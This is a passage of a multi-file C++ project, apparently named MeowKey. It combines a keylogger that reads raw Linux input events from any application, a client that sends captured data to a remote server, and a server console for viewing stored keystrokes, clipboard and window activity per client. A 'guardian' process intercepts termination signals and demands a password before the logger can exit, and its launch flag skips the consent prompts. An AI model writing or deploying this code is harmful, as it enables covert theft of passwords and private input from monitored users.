#include <stdexcept>
#include <iostream>
using namespace std; 

class SocketUtils {
private:
    static bool wsa_initialized_;

public:
    static bool initializeWSA() {
#ifdef PLATFORM_WINDOWS
        if (!wsa_initialized_) {
            WSADATA wsaData;
            int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
            if (result != 0) {
                  cerr << "WSAStartup failed: " << result <<   endl;
                return false;
            }
            wsa_initialized_ = true;
        }
#endif
        return true;
    }

    static void cleanupWSA() {
#ifdef PLATFORM_WINDOWS
        if (wsa_initialized_) {
            WSACleanup();
            wsa_initialized_ = false;
        }
#endif
    }

    static int createSocket() {
        initializeWSA();
        
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            throw   runtime_error("Failed to create socket");
        }
        
        int opt = 1;
#ifdef PLATFORM_WINDOWS
        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0) {
#else
        if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
#endif
            throw   runtime_error("Failed to set socket options");
        }
        
        return sockfd;
    }

    static void bindSocket(int sockfd, int port) {
        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = INADDR_ANY;
        server_addr.sin_port = htons(port);
        
        if (bind(sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            throw   runtime_error("Failed to bind socket");
        }
    }

    static void listenSocket(int sockfd, int backlog = 10) {
        if (listen(sockfd, backlog) < 0) {
            throw   runtime_error("Failed to listen on socket");
        }
    }

    static int acceptConnection(int sockfd) {
        sockaddr_in client_addr{};
        socklen_t client_len = sizeof(client_addr);
        
        int client_sockfd = accept(sockfd, (sockaddr*)&client_addr, &client_len);
        if (client_sockfd < 0) {
            throw   runtime_error("Failed to accept connection");
        }
        
        return client_sockfd;
    }

    static void connectToServer(int sockfd, const   string& host, int port) {
        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        
        if (inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr) <= 0) {
            throw   runtime_error("Invalid address");
        }
        
        if (connect(sockfd, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            throw   runtime_error("Failed to connect to server");
        }
    }

    static bool sendData(int sockfd, const   string& data) {
        size_t total_sent = 0;
        while (total_sent < data.size()) {
#ifdef PLATFORM_WINDOWS
            int sent = send(sockfd, data.c_str() + total_sent, 
                           (int)(data.size() - total_sent), 0);
#else
            ssize_t sent = send(sockfd, data.c_str() + total_sent, 
                               data.size() - total_sent, 0);
#endif
            if (sent <= 0) {
                return false;
            }
            total_sent += sent;
        }
        return true;
    }

    static   string receiveData(int sockfd, size_t max_size = 1024) {
        char buffer[1024];
#ifdef PLATFORM_WINDOWS
        int received = recv(sockfd, buffer, (int)(max_size - 1), 0);
#else
        ssize_t received = recv(sockfd, buffer, max_size - 1, 0);
#endif
        if (received <= 0) {
            return "";
        }
        buffer[received] = '\0';
        return   string(buffer, received);
    }
};

bool SocketUtils::wsa_initialized_ = false;

#endif

===== FILE: ./client_main.cpp =====

#include "client_cross.hpp"
#include <iostream>
#include <string>
#include <cstdlib>
#include <cstring>
using namespace std; 
void printUsage() {
      cout << "Usage: ./client <server_ip> <server_port> <client_id> [--guardian]" <<   endl;
      cout << "Example: ./client 192.168.1.100 8080 bscs24009" <<   endl;
      cout << "         ./client 192.168.1.100 8080 bscs24009 --guardian" <<   endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc > 5) {
        printUsage();
        return 1;
    }

      string server_ip = argv[1];
    int port =   stoi(argv[2]);
      string client_id = argv[3];
    
    // Check if launched by guardian (skip consent prompts)
    bool skip_consent = false;
    if (argc == 5 &&   strcmp(argv[4], "--guardian") == 0) {
        skip_consent = true;
    } 

    try {
        Client client(server_ip, port, client_id, skip_consent);
        
        if (!client.start()) {
              cerr << "Failed to start client" <<   endl;
            return 1;
        }
        
        if (!skip_consent) {
              cout << "Client running. Press Enter to stop..." <<   endl;
              cin.get();
            client.stop();
        } else {
            // In guardian mode, run indefinitely until killed
              cout << "Client running under guardian protection..." <<   endl;
            while (true) {
                  this_thread::sleep_for(  chrono::seconds(1));
            }
        }
        
    } catch (const   exception& e) {
          cerr << "Error: " << e.what() <<   endl;
        return 1;
    }

    return 0;
}  



// #include "server_cross.hpp"
// #include "../socket_utils_cross.hpp"
// #include <iostream>
// #include <thread>
// #include <string>

// using namespace std;

// class MeowKeyServer {
// private:
//     int port_;
//     atomic<bool> running_;
//     thread accept_thread_;
//     shared_ptr<ServerControl> control_;

// public:
//     MeowKeyServer(int port)
//         : port_(port), running_(false) {
//         control_ = make_shared<ServerControl>("meowkey.db");
//     }

//     ~MeowKeyServer() {
//         stop();
//     }

//     bool start() {
//         if (running_) return false;

//         running_ = true;
//         accept_thread_ = thread(&MeowKeyServer::acceptLoop, this);

//         cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
//         cout << "â•‘        ðŸ± MEOWKEY SERVER - LIVE MONITORING ðŸ±             â•‘" << endl;
//         cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
//         cout << "â•‘ Status: RUNNING                                           â•‘" << endl;
//         cout << "â•‘ Port: " << port_ << "                                              â•‘" << endl;
//         cout << "â•‘ Database: meowkey.db (B+ Tree with Hash Table)           â•‘" << endl;
//         cout << "â•‘ Max Size: 100 MB                                          â•‘" << endl;
//         cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
//         cout << "â•‘ AVAILABLE COMMANDS:                                       â•‘" << endl;
//         cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
//         cout << "â•‘ CLIENT MANAGEMENT:                                        â•‘" << endl;
//         cout << "â•‘   list                    - Show pending & active clients â•‘" << endl;
//         cout << "â•‘   accept <id>             - Accept pending client        â•‘" << endl;
//         cout << "â•‘   reject <id>             - Reject pending client        â•‘" << endl;
//         cout << "â•‘   kick <id>               - Disconnect active client     â•‘" << endl;
//         cout << "â•‘   clients                 - List all clients in DB       â•‘" << endl;
//         cout << "â•‘                                                           â•‘" << endl;
//         cout << "â•‘ DATA MANAGEMENT:                                          â•‘" << endl;
//         cout << "â•‘   view <id> [type]        - View client data (all/ks/cb/w)â•‘" << endl;
//         cout << "â•‘   range <id> <start> <end>- Query time range (microsec)  â•‘" << endl;
//         cout << "â•‘   delete <id>             - Delete all data for client   â•‘" << endl;
//         cout << "â•‘                                                           â•‘" << endl;
//         cout << "â•‘ SYSTEM:                                                   â•‘" << endl;
//         cout << "â•‘   stats                   - Database statistics          â•‘" << endl;
//         cout << "â•‘   help                    - Show this help               â•‘" << endl;
//         cout << "â•‘   quit/exit               - Shutdown server              â•‘" << endl;
//         cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n" << endl;

//         return true;
//     }

//     void stop() {
//         running_ = false;

//         if (accept_thread_.joinable()) {
//             accept_thread_.join();
//         }

//         control_->stopAllClients();
        
//         #ifdef _WIN32
//             WSACleanup();
//         #endif

//         cout << "\nâœ… Server shutdown complete" << endl;
//     }

//     void processCommand(const string& cmd) {
//         if (cmd.empty()) return;

//         istringstream iss(cmd);
//         string command;
//         iss >> command;

//         if (command == "list") {
//             control_->listClients();
//         }
//         else if (command == "accept") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->acceptClient(client_id);
//             } else {
//                 cout << "Usage: accept <client_id>" << endl;
//             }
//         }
//         else if (command == "reject") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->rejectClient(client_id);
//             } else {
//                 cout << "Usage: reject <client_id>" << endl;
//             }
//         }
//         else if (command == "kick") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->kickClient(client_id);
//             } else {
//                 cout << "Usage: kick <client_id>" << endl;
//             }
//         }
//         else if (command == "delete") {
//             string client_id;
//             if (iss >> client_id) {
//                 control_->deleteClientData(client_id);
//             } else {
//                 cout << "Usage: delete <client_id>" << endl;
//             }
//         }
//         else if (command == "view") {
//             string client_id, event_type = "all";
//             if (iss >> client_id) {
//                 iss >> event_type;
//                 if (event_type == "ks") event_type = "keystroke";
//                 if (event_type == "cb") event_type = "clipboard";
//                 if (event_type == "w") event_type = "window";
                
//                 control_->viewClientData(client_id, event_type);
//             } else {
//                 cout << "Usage: view <client_id> [all|keystroke|clipboard|window]" << endl;
//             }
//         }
//         else if (command == "range") {
//             string client_id;
//             uint64_t start_ts, end_ts;
//             if (iss >> client_id >> start_ts >> end_ts) {
//                 control_->viewRangedData(client_id, start_ts, end_ts);
//             } else {
//                 cout << "Usage: range <client_id> <start_timestamp> <end_timestamp>" << endl;
//                 cout << "       Timestamps in microseconds (epoch)" << endl;
//             }
//         }
//         else if (command == "clients") {
//             control_->listAllClients();
//         }
//         else if (command == "stats") {
//             control_->showDatabaseStats();
//         }
//         else if (command == "help") {
//             cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" << endl;
//             cout << "â•‘                   MEOWKEY SERVER HELP                      â•‘" << endl;
//             cout << "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£" << endl;
//             cout << "â•‘ CLIENT MANAGEMENT:                                        â•‘" << endl;
//             cout << "â•‘   list                    - Show pending & active clients â•‘" << endl;
//             cout << "â•‘   accept <id>             - Accept pending client        â•‘" << endl;
//             cout << "â•‘   reject <id>             - Reject pending client        â•‘" << endl;
//             cout << "â•‘   kick <id>               - Disconnect active client     â•‘" << endl;
//             cout << "â•‘   clients                 - List all clients in DB       â•‘" << endl;
//             cout << "â•‘                                                           â•‘" << endl;
//             cout << "â•‘ DATA MANAGEMENT:                                          â•‘" << endl;
//             cout << "â•‘   view <id> [type]        - View client data (all/ks/cb/w)â•‘" << endl;
//             cout << "â•‘   range <id> <start> <end>- Query time range (microsec)  â•‘" << endl;
//             cout << "â•‘   delete <id>             - Delete all data for client   â•‘" << endl;
//             cout << "â•‘                                                           â•‘" << endl;
//             cout << "â•‘ SYSTEM:                                                   â•‘" << endl;
//             cout << "â•‘   stats                   - Database statistics          â•‘" << endl;
//             cout << "â•‘   help                    - Show this help               â•‘" << endl;
//             cout << "â•‘   quit/exit               - Shutdown server              â•‘" << endl;
//             cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n" << endl;
//         }
//         else if (command == "quit" || command == "exit") {
//             cout << "\nâ¹ï¸  Shutting down server..." << endl;
//             stop();
//         }
//         else if (!command.empty()) {
//             cout << "âŒ Unknown command: '" << command << "'. Type 'help' for commands." << endl;
//         }
//     }

//     void runCommandLoop() {
//         string line;
//         while (running_) {
//             cout << "meowkey> ";
//             if (!getline(cin, line)) break;
            
//             if (!line.empty()) {
//                 processCommand(line);
//             }
//         }
//     }

// private:
//     void acceptLoop() {
//         try {
//             #ifdef _WIN32
//                 WSADATA wsa;
//                 if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
//                     cerr << "WSAStartup failed" << endl;
//                     return;
//                 }
//             #endif

//             int server_socket = SocketUtils::createSocket();
//             if (server_socket < 0) {
//                 cerr << "Failed to create socket" << endl;
//                 return;
//             }

//             SocketUtils::bindSocket(server_socket, port_);
//             SocketUtils::listenSocket(server_socket);

//             cout << "âœ… Server listening on port " << port_ << "...\n" << endl;

//             while (running_) {
//                 int client_socket = SocketUtils::acceptConnection(server_socket);
//                 if (client_socket < 0) continue;

//                 string client_id_msg = SocketUtils::receiveData(client_socket);

//                 if (client_id_msg.find("CLIENT_ID:") == 0) {
//                     string client_id = client_id_msg.substr(10);
                    
//                     client_id.erase(0, client_id.find_first_not_of(" \t\n\r"));
//                     client_id.erase(client_id.find_last_not_of(" \t\n\r") + 1);
                    
//                     if (!client_id.empty()) {
//                         control_->acceptNewConnection(client_socket, client_id);
//                     } else {
//                         #ifdef _WIN32
//                             closesocket(client_socket);
//                         #else
//                             close(client_socket);
//                         #endif
//                     }
//                 } else {
//                     cout << "âš ï¸  Invalid handshake from client" << endl;
//                     #ifdef _WIN32
//                         closesocket(client_socket);
//                     #else
//                         close(client_socket);
//                     #endif
//                 }
//             }

//             #ifdef _WIN32
//                 closesocket(server_socket);
//             #else
//                 close(server_socket);
//             #endif
//         } catch (const exception& e) {
//             cerr << "âŒ Accept loop error: " << e.what() << endl;
//         }
//     }
// };

// int main(int argc, char* argv[]) {
//     int port = 8080;

//     if (argc >= 2) {
//         port = atoi(argv[1]);
//     }

//     try {
//         MeowKeyServer server(port);
//         server.start();
//         server.runCommandLoop();
//     } catch (const exception& e) {
//         cerr << "âŒ Fatal error: " << e.what() << endl;
//         return 1;
//     }

//     return 0;
// }

===== FILE: ./process_guard_linux.hpp =====



#ifndef PROCESS_GUARD_LINUX_HPP
#define PROCESS_GUARD_LINUX_HPP

#ifdef PLATFORM_LINUX

#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string>
#include <vector>
#include <iostream>
#include <atomic>
#include <cstring>
#include "launcher_common.hpp"
#include "password_dialog_linux.hpp"
using namespace std; 

class ProcessGuardLinux {
private:
    pid_t child_pid;
      atomic<bool>& exit_authorized;
    static ProcessGuardLinux* instance_;
    
public:
    ProcessGuardLinux(  atomic<bool>& auth) 
        : child_pid(-1), exit_authorized(auth) {
        instance_ = this;
    }
    
    ~ProcessGuardLinux() {
        instance_ = nullptr;
    }
    
    bool launchClient(const   string& executable, const   string& args) {
          cout << "ðŸ›¡ï¸  Guardian: Launching protected client..." <<   endl;
        
        // Install signal handlers BEFORE forking
        installSignalHandlers();
        
        child_pid = fork();
        
        if (child_pid == -1) {
              cerr << "âŒ Fork failed: " << strerror(errno) <<   endl;
            return false;
        }
        
        if (child_pid == 0) {
            // Child process - UNBLOCK signals so child can receive them normally
            sigset_t unblock_set;
            sigfillset(&unblock_set);
            sigprocmask(SIG_UNBLOCK, &unblock_set, NULL);
            
            // Reset signal handlers to default in child
            signal(SIGINT, SIG_DFL);
            signal(SIGTERM, SIG_DFL);
            signal(SIGQUIT, SIG_DFL);
            signal(SIGHUP, SIG_DFL);
            
            // Create new process group to isolate from parent's signals
            setpgid(0, 0);
            
            // Execute the client
            executeClient(executable, args);
            _exit(1); // Should never reach here
        }
        
        // Parent process
          cout << "âœ… Client launched successfully under protection (PID: " 
                  << child_pid << ")" <<   endl;
          cout << "ðŸ”’ Exit protection active - password required to exit" <<   endl;
        
        return true;
    }
    
    void monitorProcess() {
          cout << "\nðŸ” Guardian: Monitoring client process..." <<   endl;
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" <<   endl;
          cout << "âš ï¸  IMPORTANT: To request exit, run this command in ANOTHER terminal:" <<   endl;
          cout << "    sudo kill -INT " << getpid() <<   endl;
          cout << "    (or: sudo kill -2 " << getpid() << ")" <<   endl;
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
        
        int status;
        while (true) {
            pid_t result = waitpid(child_pid, &status, WNOHANG);
            
            if (result == child_pid) {
                // Child process exited
                if (exit_authorized) {
                      cout << "âœ… Authorized exit - Guardian shutting down" <<   endl;
                    break;
                } else {
                      cout << "âš ï¸  Client process terminated unexpectedly!" <<   endl;
                    if (WIFEXITED(status)) {
                          cout << "Exit code: " << WEXITSTATUS(status) <<   endl;
                    }
                    break;
                }
            } else if (result == -1) {
                  cerr << "âŒ Error waiting for child: " << strerror(errno) <<   endl;
                break;
            }
            
            // Check if we should exit
            if (exit_authorized) {
                  cout << "ðŸ›‘ Terminating client process..." <<   endl;
                kill(child_pid, SIGTERM);
                sleep(2);
                kill(child_pid, SIGKILL);
                break;
            }
            
            usleep(100000); // 100ms
        }
    }
    
private:
    void executeClient(const   string& executable, const   string& args) {
        // Parse arguments
          vector<  string> argTokens;
          string current;
        for (char c : args) {
            if (c == ' ') {
                if (!current.empty()) {
                    argTokens.push_back(current);
                    current.clear();
                }
            } else {
                current += c;
            }
        }
        if (!current.empty()) {
            argTokens.push_back(current);
        }
        
        // Build argv
          vector<char*> argv;
        argv.push_back(const_cast<char*>(executable.c_str()));
        for (auto& arg : argTokens) {
            argv.push_back(const_cast<char*>(arg.c_str()));
        }
        argv.push_back(nullptr);
        
        // Execute
        execvp(executable.c_str(), argv.data());
        
        // If we reach here, exec failed
          cerr << "âŒ Failed to execute client: " << strerror(errno) <<   endl;
    }
    
    void installSignalHandlers() {
        // Block signals in child process by setting up handler BEFORE fork
        struct sigaction sa;
        sa.sa_handler = signalHandler;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = SA_RESTART; // Automatically restart system calls
        
        // Add all signals we want to block to the mask
        sigaddset(&sa.sa_mask, SIGINT);
        sigaddset(&sa.sa_mask, SIGTERM);
        sigaddset(&sa.sa_mask, SIGQUIT);
        sigaddset(&sa.sa_mask, SIGHUP);
        
        sigaction(SIGINT, &sa, NULL);   // Ctrl+C
        sigaction(SIGTERM, &sa, NULL);  // kill command
        sigaction(SIGQUIT, &sa, NULL);  // Ctrl+\
        sigaction(SIGHUP, &sa, NULL);   // Terminal close
        
        // Block child from receiving these signals
        sigset_t block_set;
        sigemptyset(&block_set);
        sigaddset(&block_set, SIGINT);
        sigaddset(&block_set, SIGTERM);
        sigprocmask(SIG_BLOCK, &block_set, NULL);
    }
    
    static void signalHandler(int signum) {
        // CRITICAL: Block signal from propagating to child process
        signal(signum, signalHandler); // Re-install handler
        
        const char* signame = "UNKNOWN";
        switch (signum) {
            case SIGINT: signame = "SIGINT (Ctrl+C)"; break;
            case SIGTERM: signame = "SIGTERM"; break;
            case SIGQUIT: signame = "SIGQUIT (Ctrl+\\)"; break;
            case SIGHUP: signame = "SIGHUP"; break;
        }
        
        // Use write() instead of cout (signal-safe)
        const char* msg = "\n\nðŸš¨ Signal intercepted: ";
        write(STDOUT_FILENO, msg, strlen(msg));
        write(STDOUT_FILENO, signame, strlen(signame));
        write(STDOUT_FILENO, "\n", 1);
        
        if (instance_) {
            // Redirect stdin from controlling terminal
            int tty_fd = open("/dev/tty", O_RDWR);
            if (tty_fd >= 0) {
                dup2(tty_fd, STDIN_FILENO);
                close(tty_fd);
            }
            
            instance_->handleExitAttempt();
        }
        
        // DO NOT exit or terminate - just return
    }
    
    void handleExitAttempt() {
        // Ensure we can read from terminal
          cout << "\nðŸ” Password authentication required..." <<   endl;
          cout << "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" <<   endl;
          cout << "â•‘  EXIT AUTHORIZATION REQUIRED          â•‘" <<   endl;
          cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
          cout << "Enter password to stop monitoring: " <<   flush;
        
        // Make sure stdin is unbuffered and ready
          cin.clear();
          cin.sync();
        
        // Read password
          string password;
        if (  getline(  cin, password)) {
            if (verifyPassword(password)) {
                  cout << "\nâœ… Password correct - Exit authorized" <<   endl;
                exit_authorized = true;
                
                // Terminate child gracefully
                if (child_pid > 0) {                   
                      cout << "ðŸ›‘ Terminating client process..." <<   endl;
                    kill(child_pid, SIGTERM); 
                    sleep(1);
                     
                    // Check if still alive 
                    int status;
                    pid_t result = waitpid(child_pid, &status, WNOHANG); 
                    if (result == 0) {
                        // Still running, force kill
                        kill(child_pid, SIGKILL); 
                    }
                }
                
                // Exit the guardian
                  cout << "âœ… Guardian shutdown complete" <<   endl;
                exit(0);
            } else {
                showUnauthorizedMessage();
                  cout << "ðŸ”„ Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
            }
        } else {
            // Input failed, treat as wrong password
            showUnauthorizedMessage();
              cout << "ðŸ”„ Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
        }
    }
};

ProcessGuardLinux* ProcessGuardLinux::instance_ = nullptr;

#endif // PLATFORM_LINUX
#endif  

===== FILE: ./keyboard_capture.hpp =====



#ifndef KEYBOARD_CAPTURE_HPP
#define KEYBOARD_CAPTURE_HPP

#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <cstring>
#include <thread>
#include <atomic>
#include <functional>
#include <unordered_map>
using namespace std; 

class KeyboardCapture {
private:
      atomic<bool> capturing_;
      thread capture_thread_;
      function<void(const   string&)> callback_;
      string keyboard_device_;

public:
    KeyboardCapture(  function<void(const   string&)> callback) 
        : capturing_(false), callback_(callback) {
        findKeyboardDevice();
    }

    ~KeyboardCapture() {
        stop();
    }

    bool start() {
        if (capturing_) {
            return false;
        }

        capturing_ = true;
        capture_thread_ =   thread(&KeyboardCapture::captureLoop, this);
        return true;
    }

    void stop() {
        capturing_ = false;
        if (capture_thread_.joinable()) {
            capture_thread_.join();
        }
    }

    bool isCapturing() const {
        return capturing_;
    }

      string getKeyboardDevice() const {
        return keyboard_device_;
    }

private:
    void findKeyboardDevice() {
          cout << "Searching for keyboard devices..." <<   endl;
        
        // Try event2 first (based on your system configuration)
          vector<  string> possible_paths = {
            "/dev/input/event2",  // Your specific keyboard device
            "/dev/input/event3", "/dev/input/event4", "/dev/input/event5",
            "/dev/input/event0", "/dev/input/event1", "/dev/input/event6",
            "/dev/input/event7", "/dev/input/event8", "/dev/input/event9"
        };

        for (const auto& path : possible_paths) {
              cout << "Testing device: " << path <<   endl;
            if (isKeyboardDevice(path)) {
                keyboard_device_ = path;
                  cout << "âœ“ Found keyboard device: " << path <<   endl;
                return;
            }
        }

        throw   runtime_error("Could not find keyboard device. Please check permissions.");
    }

    bool isKeyboardDevice(const   string& path) {
        int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) {
              cout << "  âœ— Cannot open: " << strerror(errno) <<   endl;
            return false;
        }

        // Get device capabilities
        unsigned long evbit = 0;
        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) < 0) {
            close(fd);
              cout << "  âœ— Cannot get capabilities" <<   endl;
            return false;
        }

        // Check if device has key events
        if (!(evbit & (1 << EV_KEY))) {
            close(fd);
              cout << "  âœ— Not a key device" <<   endl;
            return false;
        }

        // Get key bitmap to verify it's a keyboard
        unsigned char keybit[KEY_MAX/8 + 1];
        memset(keybit, 0, sizeof(keybit));
        
        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
            close(fd);
              cout << "  âœ— Cannot get key bitmap" <<   endl;
            return false;
        }

        close(fd);

        // Check for common keyboard keys
        bool has_letters = (keybit[KEY_A/8] & (1 << (KEY_A % 8)));
        bool has_space = (keybit[KEY_SPACE/8] & (1 << (KEY_SPACE % 8)));
        bool has_enter = (keybit[KEY_ENTER/8] & (1 << (KEY_ENTER % 8)));

        if (has_letters && has_space && has_enter) {
              cout << "  âœ“ Valid keyboard device" <<   endl;
            return true;
        }

          cout << "  âœ— Missing common keyboard keys" <<   endl;
        return false;
    }

    void captureLoop() {
          cout << "Starting capture loop on device: " << keyboard_device_ <<   endl;
        
        int fd = open(keyboard_device_.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) {
              cerr << "Failed to open keyboard device: " << keyboard_device_ 
                      << " Error: " << strerror(errno) <<   endl;
            return;
        }

          cout << "âœ“ Successfully opened keyboard device. Capturing keystrokes..." <<   endl;
          cout << "Try typing in any application (browser, terminal, etc.)" <<   endl;

        input_event ev;
        int event_count = 0;
        
        while (capturing_) {
            ssize_t bytes_read = read(fd, &ev, sizeof(ev));
            
            if (bytes_read == sizeof(ev)) {
                if (ev.type == EV_KEY) {
                    event_count++;
                      string event_type;
                    switch (ev.value) {
                        case 0: event_type = "RELEASE"; break;
                        case 1: event_type = "PRESS"; break;
                        case 2: event_type = "REPEAT"; break;
                        default: event_type = "UNKNOWN"; break;
                    }
                    
                    // Only process key presses for now
                    if (ev.value == 1) {
                          string key_name = keyCodeToString(ev.code);
                          cout << "[" << event_count << "] Captured key: " << key_name 
                                  << " (code: " << ev.code << ", type: " << event_type << ")" <<   endl;
                        
                        if (!key_name.empty() && callback_) {
                            callback_(key_name);
                        }
                    }
                }
            } else if (bytes_read < 0) {
                if (errno != EAGAIN) {
                    // Non-recoverable error
                      cerr << "Read error: " << strerror(errno) <<   endl;
                    break;
                }
                // EAGAIN means no data available, just continue
            }
            
              this_thread::sleep_for(  chrono::milliseconds(1));
        }

        close(fd);
          cout << "Capture loop ended. Total events processed: " << event_count <<   endl;
    }

      string keyCodeToString(int key_code) {
        static const unordered_map<int, string> key_map = {
            {KEY_A, "A"}, {KEY_B, "B"}, {KEY_C, "C"}, {KEY_D, "D"}, {KEY_E, "E"},
            {KEY_F, "F"}, {KEY_G, "G"}, {KEY_H, "H"}, {KEY_I, "I"}, {KEY_J, "J"},
            {KEY_K, "K"}, {KEY_L, "L"}, {KEY_M, "M"}, {KEY_N, "N"}, {KEY_O, "O"},
            {KEY_P, "P"}, {KEY_Q, "Q"}, {KEY_R, "R"}, {KEY_S, "S"}, {KEY_T, "T"},
            {KEY_U, "U"}, {KEY_V, "V"}, {KEY_W, "W"}, {KEY_X, "X"}, {KEY_Y, "Y"},
            {KEY_Z, "Z"},
            {KEY_0, "0"}, {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"},
            {KEY_5, "5"}, {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"},
            {KEY_SPACE, "SPACE"}, {KEY_ENTER, "ENTER"}, {KEY_BACKSPACE, "BACKSPACE"},
            {KEY_TAB, "TAB"}, {KEY_ESC, "ESC"}, {KEY_LEFTCTRL, "CTRL"},
            {KEY_LEFTSHIFT, "SHIFT"}, {KEY_RIGHTSHIFT, "RSHIFT"}, {KEY_LEFTALT, "ALT"},
            {KEY_RIGHTALT, "RALT"}, {KEY_LEFTMETA, "META"}, {KEY_RIGHTMETA, "RMETA"},
            {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"}, {KEY_SEMICOLON, ";"},
            {KEY_APOSTROPHE, "'"}, {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
            {KEY_BACKSLASH, "\\"}, {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_GRAVE, "`"},
            {KEY_UP, "UP"}, {KEY_DOWN, "DOWN"}, {KEY_LEFT, "LEFT"}, {KEY_RIGHT, "RIGHT"},
            {KEY_F1, "F1"}, {KEY_F2, "F2"}, {KEY_F3, "F3"}, {KEY_F4, "F4"},
            {KEY_F5, "F5"}, {KEY_F6, "F6"}, {KEY_F7, "F7"}, {KEY_F8, "F8"},
            {KEY_F9, "F9"}, {KEY_F10, "F10"}, {KEY_F11, "F11"}, {KEY_F12, "F12"}
        };

        auto it = key_map.find(key_code);
        if (it != key_map.end()) {
            return it->second;
        }
        return "KEY_" +   to_string(key_code);
    }
};

#endif 

===== FILE: ./guardian_exit.cpp =====

#include <iostream>
#include <string>
#include <csignal>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <fstream>
#include <sstream>
#include <termios.h>
#include <vector>
using namespace std; 
  string getPasswordInput() {
      string password;
    
    // Disable echo
    termios oldt;
    tcgetattr(STDIN_FILENO, &oldt);
    termios newt = oldt;
    newt.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    
    // Read password
      getline(  cin, password);
    
    // Restore echo
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    
    return password;
}

  vector<pid_t> findAllProcesses() {
      vector<pid_t> pids;
    
    // Find launcher process
      string cmd_launcher = "pgrep -f './launcher' 2>/dev/null";
    FILE* pipe = popen(cmd_launcher.c_str(), "r");
    if (pipe) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            pids.push_back(  stoi(buffer));
        }
        pclose(pipe);
    }
    
